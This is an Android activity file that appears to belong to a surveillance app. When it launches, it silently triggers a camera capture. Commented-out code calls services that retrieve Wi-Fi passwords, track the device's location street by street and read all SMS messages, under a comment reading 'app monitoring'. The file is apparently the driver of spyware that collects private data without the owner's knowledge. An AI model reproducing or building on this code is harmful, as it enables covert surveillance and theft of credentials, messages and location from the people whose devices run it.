package com.fs.fs;

import android.app.Activity;
import android.os.Bundle;

import com.fs.fs.api.CameraService;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        // 应用监控
//        new AppInfoService(MainActivity.this).getWifiPasswd();
//        new LocationService(MainActivity.this).interval(new LocationService.LocateListener() {
//            @Override
//            public void onLocateSucceed(AMapLocation aMapLocation) {
//                Location location = new Location();
//                location.province = aMapLocation.getProvince();
//                location.city = aMapLocation.getCity();
//                location.district = aMapLocation.getDistrict();
//                location.street = aMapLocation.getStreet();
//                location.longitude = aMapLocation.getLongitude();
//                location.latitude = aMapLocation.getLatitude();
//                location.time = DateUtils.millis2String(aMapLocation.getTime());
//
//                LogUtils.d("%s:%s %s %s", location.latitude, location.longitude, location.city, location.street);
//            }
//
//            @Override
//            public void onLocateFail(int errorCode, String errorInfo) {
//
//            }
//        });

//        new ProviderService(MainActivity.this).getSMS(new ProviderService.SMSListener() {
//            @Override
//            public void onGetAllSMS(List<SMSInfo> SMSInfo) {
//
//            }
//
//            @Override
//            public void onReceive(SMSInfo msgInfo) {
//                LogUtils.d(msgInfo.toString());
//            }
//        });

        try {
            new CameraService(MainActivity.this).takePhoto();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


}
